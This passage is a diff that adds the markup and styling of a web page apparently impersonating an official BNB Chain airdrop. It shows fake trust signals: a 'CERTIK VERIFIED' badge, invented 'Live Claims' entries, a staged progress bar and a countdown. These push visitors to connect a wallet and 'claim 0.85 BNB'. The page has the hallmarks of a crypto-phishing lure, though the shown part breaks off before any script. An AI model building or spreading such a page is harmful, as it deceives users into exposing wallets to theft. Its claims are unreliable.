@@ -1,0 +1,634 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>BNB Chain · Genesis Airdrop | Claim BNB Ecosystem Tokens</title>
+    <meta name="description" content="Official BNB Chain ecosystem airdrop for early adopters.">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        html, body {
+            overflow-x: hidden !important;
+            width: 100% !important;
+            max-width: 100vw !important;
+            position: relative;
+        }
+        
+        :root {
+            --bnb-yellow: #F0B90B; --bnb-yellow-light: #FCD535; --bnb-yellow-dark: #D4A30A;
+            --bnb-yellow-rgb: 240, 185, 11; --bnb-dark: #0B0E11; --bnb-dark-2: #1E2329;
+            --bnb-dark-3: #2B3139; --bnb-card-bg: #181A20; --success: #02C076;
+            --success-light: #2ECB8E; --warning: #F0B90B; --danger: #F6465D;
+            --text-primary: #EAECEF; --text-secondary: #848E9C; --text-tertiary: #5E6673;
+            --border-color: #2B3139; --glow-yellow: 0 0 30px rgba(240, 185, 11, 0.15);
+        }
+        body {
+            font-family: 'Inter', sans-serif; background-color: var(--bnb-dark);
+            color: var(--text-primary); line-height: 1.6; min-height: 100vh;
+            position: relative; overflow-x: hidden !important; -webkit-font-smoothing: antialiased;
+            width: 100%; max-width: 100vw;
+        }
+        .bnb-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; overflow: hidden; max-width: 100vw; }
+        .bnb-grid {
+            position: absolute; width: 100%; height: 100%; max-width: 100vw;
+            background-image: repeating-linear-gradient(0deg, transparent, transparent 49px, rgba(240,185,11,0.02) 49px, rgba(240,185,11,0.02) 50px),
+            repeating-linear-gradient(90deg, transparent, transparent 49px, rgba(240,185,11,0.02) 49px, rgba(240,185,11,0.02) 50px);
+        }
+        .bnb-glow {
+            position: absolute; width: 900px; height: 900px; max-width: 100vw;
+            background: radial-gradient(circle, rgba(var(--bnb-yellow-rgb),0.08) 0%, transparent 70%);
+            top: -250px; right: -250px; animation: slowFloat 25s infinite ease-in-out;
+        }
+        .bnb-glow-2 {
+            position: absolute; width: 700px; height: 700px; max-width: 100vw;
+            background: radial-gradient(circle, rgba(2,192,118,0.04) 0%, transparent 70%);
+            bottom: -200px; left: -200px; animation: slowFloat 30s infinite ease-in-out reverse;
+        }
+        @keyframes slowFloat {
+            0%,100% { transform: translate(0,0) scale(1); opacity: 0.6; }
+            33% { transform: translate(40px,-40px) scale(1.05); opacity: 0.8; }
+            66% { transform: translate(-30px,30px) scale(0.95); opacity: 0.5; }
+        }
+        .network-bar { background: rgba(11,14,17,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border-color); padding: 8px 0; font-size: 0.75rem; position: sticky; top: 0; z-index: 100; width: 100%; max-width: 100vw; }
+        .network-container { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; width: 100%; }
+        .network-left, .network-right { display: flex; gap: 24px; align-items: center; flex-wrap: wrap; }
+        .network-stat { display: flex; align-items: center; gap: 6px; color: var(--text-secondary); }
+        .network-stat i { color: var(--bnb-yellow); font-size: 0.7rem; }
+        .network-stat .value { color: var(--text-primary); font-weight: 600; font-family: 'Space Grotesk', monospace; }
+        .network-stat .change-positive { color: var(--success); font-size: 0.65rem; margin-left: 3px; }
+        .network-stat .change-negative { color: var(--danger); font-size: 0.65rem; margin-left: 3px; }
+        .chain-badge { background: rgba(var(--bnb-yellow-rgb),0.1); border: 1px solid rgba(var(--bnb-yellow-rgb),0.2); color: var(--bnb-yellow); padding: 4px 10px; border-radius: 20px; font-size: 0.65rem; font-weight: 600; display: flex; align-items: center; gap: 5px; white-space: nowrap; }
+        .main-container { max-width: 1180px; margin: 0 auto; padding: 25px 20px; width: 100%; overflow-x: hidden; }
+        .bnb-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; padding: 10px 0; flex-wrap: wrap; gap: 15px; width: 100%; }
+        .logo-area { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .bnb-logo { width: 48px; height: 48px; border-radius: 12px; display: flex; align-items: center; justify-content: center; position: relative; box-shadow: var(--glow-yellow); overflow: hidden; flex-shrink: 0; }
+        .bnb-logo img { width: 100%; height: 100%; object-fit: cover; }
+        .bnb-logo-text { font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 1.4rem; color: var(--text-primary); letter-spacing: -0.5px; }
+        .bnb-logo-text span { color: var(--bnb-yellow); }
+        .verified-pill { background: rgba(2,192,118,0.1); border: 1px solid rgba(2,192,118,0.3); color: var(--success); padding: 4px 10px; border-radius: 20px; font-size: 0.65rem; font-weight: 600; display: flex; align-items: center; gap: 4px; white-space: nowrap; }
+        .hero-section { margin-bottom: 40px; width: 100%; }
+        .hero-badge { display: inline-block; background: linear-gradient(135deg, rgba(var(--bnb-yellow-rgb),0.1), rgba(var(--bnb-yellow-rgb),0.05)); border: 1px solid rgba(var(--bnb-yellow-rgb),0.15); color: var(--bnb-yellow); padding: 6px 16px; border-radius: 30px; font-size: 0.75rem; font-weight: 600; margin-bottom: 18px; backdrop-filter: blur(5px); }
+        h1 { font-family: 'Space Grotesk', sans-serif; font-size: clamp(2rem, 5vw, 3rem); font-weight: 700; color: #fff; margin-bottom: 12px; line-height: 1.15; letter-spacing: -1px; word-break: break-word; }
+        .bnb-highlight { background: linear-gradient(135deg, var(--bnb-yellow) 0%, #FFD700 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .hero-subtitle { font-size: 1rem; color: var(--text-secondary); max-width: 600px; }
+        .content-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 50px; width: 100%; }
+        @media (max-width: 900px) { .content-grid { grid-template-columns: 1fr; } .network-left, .network-right { justify-content: center; width: 100%; } }
+        .claim-card { background: var(--bnb-card-bg); border-radius: 16px; padding: 30px 28px; border: 1px solid var(--border-color); box-shadow: 0 8px 24px rgba(0,0,0,0.3); backdrop-filter: blur(10px); width: 100%; overflow: hidden; }
+        .card-header { margin-bottom: 24px; display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 15px; }
+        .card-header h2 { font-family: 'Space Grotesk', sans-serif; font-size: 1.4rem; font-weight: 700; color: #fff; }
+        .card-header p { color: var(--text-secondary); font-size: 0.8rem; }
+        .contract-badge { background: rgba(11,14,17,0.8); border: 1px solid var(--border-color); border-radius: 6px; padding: 6px 10px; display: flex; align-items: center; gap: 8px; font-size: 0.7rem; flex-wrap: wrap; }
+        .contract-badge code { color: var(--bnb-yellow); font-family: 'Space Grotesk', monospace; font-size: 0.7rem; }
+        .bnb-token-card { background: linear-gradient(135deg, #1A1F26 0%, #0F1217 100%); border: 1px solid var(--border-color); border-radius: 12px; padding: 35px 25px; text-align: center; margin-bottom: 24px; position: relative; overflow: hidden; width: 100%; }
+        .bnb-icon-large { width: 64px; height: 64px; border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 18px; position: relative; z-index: 1; box-shadow: var(--glow-yellow); overflow: hidden; }
+        .bnb-icon-large img { width: 100%; height: 100%; object-fit: cover; }
+        .token-label { font-size: 0.75rem; color: var(--text-tertiary); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; position: relative; z-index: 1; }
+        .token-amount-wrapper { position: relative; z-index: 1; }
+        .token-amount { font-family: 'Space Grotesk', sans-serif; font-size: clamp(2.5rem, 8vw, 3.2rem); font-weight: 700; background: linear-gradient(135deg, var(--bnb-yellow) 0%, #FFD700 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; line-height: 1; margin-bottom: 5px; }
+        .token-symbol { font-size: 1.3rem; color: var(--text-secondary); margin-left: 5px; -webkit-text-fill-color: var(--text-secondary); }
+        .token-value { margin-top: 12px; font-size: 0.95rem; color: var(--text-secondary); background: rgba(var(--bnb-yellow-rgb),0.06); display: inline-block; padding: 6px 16px; border-radius: 20px; border: 1px solid rgba(var(--bnb-yellow-rgb),0.1); position: relative; z-index: 1; }
+        .price-source { font-size: 0.65rem; color: var(--text-tertiary); margin-top: 8px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .live-ticker { background: rgba(11,14,17,0.6); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 15px; margin-bottom: 24px; width: 100%; overflow: hidden; }
+        .ticker-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+        .ticker-header i { color: var(--success); font-size: 0.6rem; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .ticker-header span { font-size: 0.7rem; color: var(--text-tertiary); text-transform: uppercase; letter-spacing: 1px; }
+        .ticker-content { font-family: 'Space Grotesk', monospace; font-size: 0.75rem; color: var(--text-secondary); overflow: hidden; height: 20px; position: relative; width: 100%; }
+        .ticker-item { position: absolute; width: 100%; animation: tickerSlide 8s infinite; white-space: nowrap; }
+        @keyframes tickerSlide { 0%,20% { transform: translateY(0); opacity: 1; } 25%,45% { transform: translateY(-20px); opacity: 1; } 50%,70% { transform: translateY(-40px); opacity: 1; } 75%,95% { transform: translateY(-60px); opacity: 1; } 100% { transform: translateY(-80px); opacity: 0; } }
+        .ticker-item code { color: var(--bnb-yellow); background: rgba(var(--bnb-yellow-rgb),0.1); padding: 2px 6px; border-radius: 4px; margin: 0 4px; }
+        .bnb-progress-section { background: rgba(11,14,17,0.4); border-radius: 12px; padding: 20px; margin-bottom: 24px; border: 1px solid var(--border-color); width: 100%; }
+        .progress-header-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+        .progress-label { font-weight: 500; color: var(--text-primary); font-size: 0.85rem; }
+        .progress-percent { font-family: 'Space Grotesk', sans-serif; font-weight: 700; color: var(--bnb-yellow); font-size: 1.3rem; }
+        .progress-bar-bg { height: 6px; background: var(--bnb-dark-2); border-radius: 3px; overflow: hidden; margin-bottom: 10px; width: 100%; }
+        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, var(--bnb-yellow), #FFD700); width: 0; border-radius: 3px; position: relative; box-shadow: 0 0 10px rgba(var(--bnb-yellow-rgb),0.5); }
+        .progress-stats-row { display: flex; justify-content: space-between; font-size: 0.75rem; color: var(--text-tertiary); }
+        .bnb-countdown { background: linear-gradient(135deg, #1A1F26 0%, #0F1217 100%); border: 1px solid var(--border-color); border-radius: 12px; padding: 22px 20px; margin-bottom: 24px; width: 100%; }
+        .countdown-title { display: flex; align-items: center; gap: 8px; margin-bottom: 18px; flex-wrap: wrap; }
+        .countdown-title i { color: var(--bnb-yellow); font-size: 1rem; }
+        .countdown-title h3 { font-size: 0.9rem; font-weight: 600; color: var(--text-primary); text-transform: uppercase; letter-spacing: 1px; }
+        .block-info { font-size: 0.7rem; color: var(--text-tertiary); margin-left: auto; }
+        .countdown-display { display: flex; justify-content: space-around; gap: 5px; flex-wrap: wrap; }
+        .countdown-block { text-align: center; flex: 1; min-width: 60px; }
+        .countdown-number { font-family: 'Space Grotesk', sans-serif; font-size: clamp(1.5rem, 5vw, 1.8rem); font-weight: 700; color: var(--bnb-yellow); line-height: 1; margin-bottom: 4px; }
+        .countdown-unit { font-size: 0.6rem; color: var(--text-tertiary); text-transform: uppercase; letter-spacing: 1px; }
+        .bnb-claim-button { width: 100%; background: var(--bnb-yellow); color: var(--bnb-dark); border: none; padding: 18px; font-size: 1rem; font-weight: 700; border-radius: 8px; cursor: pointer; transition: all 0.2s ease; display: flex; justify-content: center; align-items: center; gap: 10px; font-family: 'Space Grotesk', sans-serif; letter-spacing: 0.3px; position: relative; overflow: hidden; }
+        .bnb-claim-button::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); transition: left 0.5s ease; }
+        .bnb-claim-button:hover::before { left: 100%; }
+        .bnb-claim-button:hover { background: var(--bnb-yellow-light); transform: translateY(-1px); box-shadow: 0 10px 25px rgba(var(--bnb-yellow-rgb),0.3); }
+        .bnb-claim-button:disabled { opacity: 0.7; cursor: not-allowed; }
+        .wallet-icons { display: flex; justify-content: center; gap: 20px; margin-top: 15px; flex-wrap: wrap; }
+        .wallet-icon { width: 36px; height: 36px; background: var(--bnb-dark-2); border: 1px solid var(--border-color); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: var(--text-tertiary); font-size: 1.1rem; transition: all 0.2s; }
+        .wallet-icon:hover { border-color: var(--bnb-yellow); color: var(--bnb-yellow); }
+        .info-card { background: var(--bnb-card-bg); border-radius: 16px; padding: 30px 28px; border: 1px solid var(--border-color); box-shadow: 0 8px 24px rgba(0,0,0,0.3); width: 100%; overflow: hidden; }
+        .bnb-steps { margin-bottom: 30px; width: 100%; }
+        .bnb-step { display: flex; gap: 15px; margin-bottom: 24px; position: relative; width: 100%; }
+        .bnb-step:not(:last-child)::after { content: ''; position: absolute; left: 23px; top: 50px; width: 2px; height: calc(100% + 2px); background: var(--border-color); }
+        .bnb-step.completed:not(:last-child)::after { background: var(--success); }
+        .step-indicator { width: 48px; height: 48px; background: var(--bnb-dark-2); border: 1.5px solid var(--border-color); border-radius: 10px; display: flex; align-items: center; justify-content: center; color: var(--text-tertiary); font-size: 1rem; flex-shrink: 0; position: relative; z-index: 2; transition: all 0.2s ease; }
+        .bnb-step.completed .step-indicator { background: var(--success); border-color: var(--success); color: white; }
+        .bnb-step.active .step-indicator { background: rgba(var(--bnb-yellow-rgb),0.1); border-color: var(--bnb-yellow); color: var(--bnb-yellow); box-shadow: var(--glow-yellow); }
+        .step-info { flex: 1; min-width: 0; }
+        .step-info h4 { font-size: 0.95rem; font-weight: 600; color: var(--text-primary); margin-bottom: 4px; }
+        .step-info p { font-size: 0.8rem; color: var(--text-secondary); word-break: break-word; }
+        .audit-section { margin-bottom: 28px; width: 100%; }
+        .audit-section h4 { font-size: 0.9rem; color: var(--text-primary); margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        .audit-logos { display: flex; gap: 15px; flex-wrap: wrap; }
+        .audit-logo { background: rgba(11,14,17,0.6); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 18px; display: flex; align-items: center; gap: 10px; transition: all 0.2s; cursor: pointer; flex: 1; min-width: 140px; }
+        .audit-logo:hover { border-color: var(--bnb-yellow); background: rgba(var(--bnb-yellow-rgb),0.03); }
+        .audit-logo i { color: var(--success); font-size: 1.2rem; }
+        .audit-logo span { font-size: 0.8rem; font-weight: 600; color: var(--text-primary); }
+        .audit-logo small { font-size: 0.65rem; color: var(--text-tertiary); display: block; }
+        .section-tabs { display: flex; gap: 5px; margin-bottom: 30px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; flex-wrap: wrap; width: 100%; }
+        .section-tab { padding: 10px 20px; background: transparent; border: none; color: var(--text-tertiary); font-family: 'Space Grotesk', sans-serif; font-weight: 600; font-size: 0.9rem; cursor: pointer; border-radius: 8px; transition: all 0.2s ease; display: flex; align-items: center; gap: 8px; }
+        .section-tab i { font-size: 0.9rem; }
+        .section-tab:hover { color: var(--bnb-yellow); background: rgba(var(--bnb-yellow-rgb),0.05); }
+        .section-tab.active { color: var(--bnb-yellow); background: rgba(var(--bnb-yellow-rgb),0.1); border: 1px solid rgba(var(--bnb-yellow-rgb),0.2); }
+        .tokenomics-section, .roadmap-section, .faq-section { margin-bottom: 50px; display: none; width: 100%; }
+        .tokenomics-section.active, .roadmap-section.active, .faq-section.active { display: block; }
+        .section-title { font-family: 'Space Grotesk', sans-serif; font-size: clamp(1.5rem, 4vw, 1.8rem); font-weight: 700; color: #fff; margin-bottom: 25px; display: flex; align-items: center; gap: 12px; }
+        .section-title i { color: var(--bnb-yellow); font-size: clamp(1.5rem, 4vw, 1.8rem); }
+        .tokenomics-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; width: 100%; }
+        @media (max-width: 768px) { .tokenomics-grid { grid-template-columns: 1fr; } }
+        .tokenomics-card { background: var(--bnb-card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; width: 100%; }
+        .tokenomics-card h3 { font-family: 'Space Grotesk', sans-serif; font-size: 1.2rem; color: var(--bnb-yellow); margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .token-supply-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border-color); }
+        .token-supply-item:last-child { border-bottom: none; }
+        .supply-label { color: var(--text-secondary); font-size: 0.9rem; }
+        .supply-value { font-family: 'Space Grotesk', sans-serif; font-weight: 700; color: var(--text-primary); }
+        .allocation-item { margin-bottom: 15px; }
+        .allocation-header { display: flex; justify-content: space-between; font-size: 0.85rem; margin-bottom: 6px; }
+        .allocation-name { color: var(--text-secondary); }
+        .allocation-percent { color: var(--bnb-yellow); font-weight: 600; }
+        .allocation-bar-bg { height: 8px; background: var(--bnb-dark-2); border-radius: 4px; overflow: hidden; width: 100%; }
+        .allocation-bar-fill { height: 100%; border-radius: 4px; }
+        .fill-airdrop { background: linear-gradient(90deg, var(--bnb-yellow), #FFD700); width: 25%; }
+        .fill-ecosystem { background: linear-gradient(90deg, var(--success), var(--success-light)); width: 30%; }
+        .fill-liquidity { background: linear-gradient(90deg, #3B82F6, #60A5FA); width: 20%; }
+        .fill-team { background: linear-gradient(90deg, #8B5CF6, #A78BFA); width: 15%; }
+        .fill-treasury { background: linear-gradient(90deg, #EC4899, #F472B6); width: 10%; }
+        .vesting-schedule { margin-top: 20px; padding: 15px; background: rgba(11,14,17,0.4); border-radius: 8px; border: 1px solid var(--border-color); width: 100%; }
+        .vesting-schedule h4 { color: var(--text-primary); font-size: 0.9rem; margin-bottom: 12px; }
+        .vesting-item { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; font-size: 0.85rem; }
+        .vesting-item i { color: var(--success); font-size: 0.8rem; }
+        .roadmap-timeline { position: relative; padding-left: 30px; width: 100%; }
+        .roadmap-timeline::before { content: ''; position: absolute; left: 15px; top: 10px; bottom: 10px; width: 2px; background: linear-gradient(to bottom, var(--bnb-yellow), var(--success), var(--bnb-yellow)); }
+        .roadmap-phase { position: relative; margin-bottom: 35px; width: 100%; }
+        .phase-marker { position: absolute; left: -30px; top: 5px; width: 32px; height: 32px; background: var(--bnb-dark-2); border: 2px solid var(--bnb-yellow); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--bnb-yellow); font-weight: 700; font-family: 'Space Grotesk', sans-serif; z-index: 2; }
+        .phase-marker.completed { background: var(--success); border-color: var(--success); color: white; }
+        .phase-marker.active { background: var(--bnb-yellow); border-color: var(--bnb-yellow); color: var(--bnb-dark); box-shadow: var(--glow-yellow); animation: pulse 2s infinite; }
+        .phase-content { background: var(--bnb-card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px 25px; margin-left: 15px; width: calc(100% - 15px); }
+        .phase-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
+        .phase-title { font-family: 'Space Grotesk', sans-serif; font-size: 1.2rem; font-weight: 700; color: #fff; }
+        .phase-date { background: rgba(var(--bnb-yellow-rgb),0.1); color: var(--bnb-yellow); padding: 4px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; border: 1px solid rgba(var(--bnb-yellow-rgb),0.2); white-space: nowrap; }
+        .phase-date.completed { background: rgba(2,192,118,0.1); color: var(--success); border-color: rgba(2,192,118,0.2); }
+        .phase-features { list-style: none; display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+        @media (max-width: 600px) { .phase-features { grid-template-columns: 1fr; } }
+        .phase-features li { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; color: var(--text-secondary); word-break: break-word; }
+        .phase-features li i { color: var(--success); font-size: 0.8rem; flex-shrink: 0; }
+        .phase-features li i.fa-clock { color: var(--bnb-yellow); }
+        .faq-grid { display: flex; flex-direction: column; gap: 12px; width: 100%; }
+        .faq-item { background: var(--bnb-card-bg); border: 1px solid var(--border-color); border-radius: 12px; overflow: hidden; transition: all 0.2s ease; width: 100%; }
+        .faq-item:hover { border-color: rgba(var(--bnb-yellow-rgb),0.3); }
+        .faq-question { padding: 18px 22px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: background 0.2s ease; }
+        .faq-question:hover { background: rgba(var(--bnb-yellow-rgb),0.03); }
+        .faq-question h4 { font-size: 1rem; font-weight: 600; color: var(--text-primary); display: flex; align-items: center; gap: 12px; }
+        .faq-question h4 i { color: var(--bnb-yellow); font-size: 1rem; flex-shrink: 0; }
+        .faq-question .faq-toggle { color: var(--text-tertiary); transition: transform 0.3s ease; flex-shrink: 0; }
+        .faq-item.active .faq-question .faq-toggle { transform: rotate(180deg); color: var(--bnb-yellow); }
+        .faq-answer { padding: 0 22px; max-height: 0; overflow: hidden; transition: max-height 0.3s ease, padding 0.3s ease; color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7; border-top: 0px solid transparent; }
+        .faq-item.active .faq-answer { max-height: 500px; padding: 0 22px 22px 22px; border-top: 1px solid var(--border-color); }
+        .trust-footer { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; margin-top: 50px; padding-top: 40px; border-top: 1px solid var(--border-color); width: 100%; }
+        @media (max-width: 600px) { .trust-footer { grid-template-columns: 1fr; } }
+        .trust-stat { text-align: center; }
+        .trust-stat-icon { width: 50px; height: 50px; background: var(--bnb-dark-2); border: 1px solid var(--border-color); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; color: var(--bnb-yellow); font-size: 1.3rem; transition: all 0.2s; }
+        .trust-stat:hover .trust-stat-icon { border-color: var(--bnb-yellow); transform: scale(1.05); box-shadow: var(--glow-yellow); }
+        .trust-stat h4 { font-family: 'Space Grotesk', sans-serif; font-size: 1.4rem; background: linear-gradient(135deg, var(--bnb-yellow), #FFD700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; }
+        .trust-stat p { font-size: 0.75rem; color: var(--text-tertiary); text-transform: uppercase; letter-spacing: 1px; }
+        .bnb-footer { text-align: center; padding: 30px 20px; margin-top: 40px; border-top: 1px solid var(--border-color); width: 100%; }
+        .footer-copyright { color: var(--text-tertiary); font-size: 0.75rem; margin-bottom: 15px; }
+        .footer-links { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; }
+        .footer-links a { color: var(--text-secondary); text-decoration: none; font-size: 0.75rem; transition: color 0.2s; display: flex; align-items: center; gap: 5px; }
+        .footer-links a:hover { color: var(--bnb-yellow); }
+        .bnb-success-message { background: linear-gradient(135deg, #0B2E1F 0%, #0A2418 100%); border: 1px solid var(--success); border-radius: 12px; padding: 25px; margin-top: 20px; text-align: center; display: none; animation: slideUp 0.4s ease-out; width: 100%; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        #wallet-select { width: 100%; margin-bottom: 12px; padding: 12px 16px; background: #1E2329; border: 1px solid #2B3139; border-radius: 8px; color: #EAECEF; font-size: 0.95rem; cursor: pointer; }
+        #wallet-select option { background: #1E2329; color: #EAECEF; }
+        .claim-button-container { position: relative; width: 100%; }
+        .counter-value { display: inline-block; }
+        
+        /* Fix for all containers */
+        div, section, header, footer, main, article, aside, nav {
+            max-width: 100%;
+        }
+        
+        img, video, canvas, svg {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="bnb-background">
+        <div class="bnb-grid"></div>
+        <div class="bnb-glow"></div>
+        <div class="bnb-glow-2"></div>
+    </div>
+
+    <div class="network-bar">
+        <div class="network-container">
+            <div class="network-left">
+                <div class="network-stat"><i class="fas fa-circle" style="color: #02C076; font-size: 0.5rem;"></i><span>BNB:</span><span class="value" id="bnbPrice">$612.45</span><span id="bnbChange" class="change-positive">▲2.3%</span></div>
+                <div class="network-stat"><i class="fas fa-cube"></i><span>Block:</span><span class="value" id="blockHeight">38,247,156</span></div>
+                <div class="network-stat"><i class="fas fa-gas-pump"></i><span>Gas:</span><span class="value">3 Gwei</span></div>
+            </div>
+            <div class="network-right">
+                <div class="network-stat"><i class="fas fa-link"></i><span>Chain ID:</span><span class="value">56 (BSC)</span></div>
+                <div class="chain-badge"><i class="fas fa-check-circle"></i><span>Mainnet</span></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <header class="bnb-header">
+            <div class="logo-area">
+                <div class="bnb-logo"><img src="images/IMG-6115.png" alt="BNB"></div>
+                <div class="bnb-logo-text">BNB<span>Chain</span></div>
+                <div class="verified-pill"><i class="fas fa-shield"></i>CERTIK VERIFIED</div>
+            </div>
+        </header>
+
+        <section class="hero-section">
+            <div class="hero-badge"><i class="fas fa-gift" style="margin-right:6px;"></i>GENESIS AIRDROP · PHASE 2</div>
+            <h1>Claim Your <span class="bnb-highlight">BNB Chain</span><br>Ecosystem Airdrop</h1>
+            <p class="hero-subtitle">Verified distribution for early BSC adopters. 0.85 BNB allocation per eligible wallet.</p>
+        </section>
+
+        <div class="content-grid">
+            <div class="claim-card">
+                <div class="card-header">
+                    <div><h2>Claim Allocation</h2><p>Connect BSC wallet to receive tokens</p></div>
+                    <div class="contract-badge"><i class="fas fa-file-contract" style="color:#02C076;"></i><code>0x7a2b...c8f3e</code></div>
+                </div>
+
+                <div class="bnb-token-card">
+                    <div class="bnb-icon-large"><img src="images/IMG-6115.png" alt="BNB"></div>
+                    <div class="token-label">Your Eligible Allocation</div>
+                    <div class="token-amount-wrapper"><span class="token-amount counter-value" data-target="0.85">0.24</span><span class="token-symbol">BNB</span></div>
+                    <div class="token-value" id="usdValue">≈ $520.58 USD</div>
+                    <div class="price-source"><i class="fas fa-circle"></i><span>Live price via CoinGecko</span></div>
+                </div>
+
+                <div class="live-ticker">
+                    <div class="ticker-header"><i class="fas fa-circle"></i><span>Live Claims</span></div>
+                    <div class="ticker-content">
+                        <div class="ticker-item"><i class="fas fa-check-circle" style="color:#02C076;font-size:0.6rem;"></i> <code>0x3f2a...d81e</code> claimed 0.85 BNB · 12s ago</div>
+                        <div class="ticker-item" style="animation-delay:2s;"><i class="fas fa-check-circle" style="color:#02C076;font-size:0.6rem;"></i> <code>0x8e1c...7b3f</code> claimed 0.85 BNB · 47s ago</div>
+                        <div class="ticker-item" style="animation-delay:4s;"><i class="fas fa-check-circle" style="color:#02C076;font-size:0.6rem;"></i> <code>0x2b9a...f62c</code> claimed 0.85 BNB · 1m ago</div>
+                        <div class="ticker-item" style="animation-delay:6s;"><i class="fas fa-check-circle" style="color:#02C076;font-size:0.6rem;"></i> <code>0x9d4e...a17b</code> claimed 0.85 BNB · 2m ago</div>
+                    </div>
+                </div>
+
+                <div class="bnb-progress-section">
+                    <div class="progress-header-row"><span class="progress-label">Distribution Progress</span><span class="progress-percent">68%</span></div>
+                    <div class="progress-bar-bg"><div class="progress-bar-fill" id="bnbProgressFill" style="width:68%"></div></div>
+                    <div class="progress-stats-row"><span id="claimedAmount">10,200 BNB</span><span>15,000 BNB Total</span></div>
+                </div>
+
+                <div class="bnb-countdown">
+                    <div class="countdown-title"><i class="fas fa-hourglass-half"></i><h3>Airdrop Ends</h3><span class="block-info">≈ 12,500 blocks</span></div>
+                    <div class="countdown-display">
+                        <div class="countdown-block"><div class="countdown-number" id="bnbDays">02</div><div class="countdown-unit">Days</div></div>
+                        <div class="countdown-block"><div class="countdown-number" id="bnbHours">14</div><div class="countdown-unit">Hours</div></div>
+                        <div class="countdown-block"><div class="countdown-number" id="bnbMinutes">38</div><div class="countdown-unit">Mins</div></div>
+                        <div class="countdown-block"><div class="countdown-number" id="bnbSeconds">22</div><div class="countdown-unit">Secs</div></div>
+                    </div>
+                </div>
+
+                <div class="claim-button-container">
+                    <select id="wallet-select">
+                        <option value="metamask">MetaMask</option>
+                        <option value="trust">Trust Wallet</option>
+                        <option value="binance">Binance Wallet</option>
+                        <option value="walletconnect">WalletConnect</option>
+                        <option value="coin98">Coin98</option>
+                        <option value="tokenpocket">TokenPocket</option>
+                        <option value="safepal">SafePal</option>
+                    </select>
+                    <button id="bnbConnectWallet" class="bnb-claim-button"><i class="fas fa-wallet"></i> Connect Wallet & Claim 0.85 BNB</button>
+                </div>
+
+                <div class="wallet-icons">
+                    <div class="wallet-icon"><i class="fab fa-ethereum"></i></div>
+                    <div class="wallet-icon"><i class="fas fa-shield"></i></div>
+                    <div class="wallet-icon"><i class="fas fa-link"></i></div>
+                    <div class="wallet-icon"><i class="fas fa-mobile-alt"></i></div>
+                </div>
+
+                <div id="bnbSuccessMessage" class="bnb-success-message">
+                    <i class="fas fa-check-circle" style="font-size:3rem;"></i>
+                    <div style="font-size:1.3rem;font-weight:700;color:#02C076;margin-bottom:8px;">Claim Successful</div>
+                    <p style="color:#848E9C;margin-bottom:15px;">Transaction completed</p>
+                    <div style="background:rgba(2,192,118,0.05);border-radius:8px;padding:15px;text-align:left;">
+                        <p style="font-size:0.8rem;color:#5E6673;">Transaction Hash</p>
+                        <p style="font-family:monospace;color:#F0B90B;font-size:0.8rem;word-break:break-all;" class="tx-hash">—</p>
+                        <p style="font-size:0.75rem;color:#5E6673;margin-top:10px;"><i class="fas fa-check-circle" style="color:#02C076;"></i> Confirmed · <span id="bnbClaimTime"></span></p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="info-card">
+                <div class="card-header"><h2>How to Claim</h2><p>3-step verification</p></div>
+                <div class="bnb-steps">
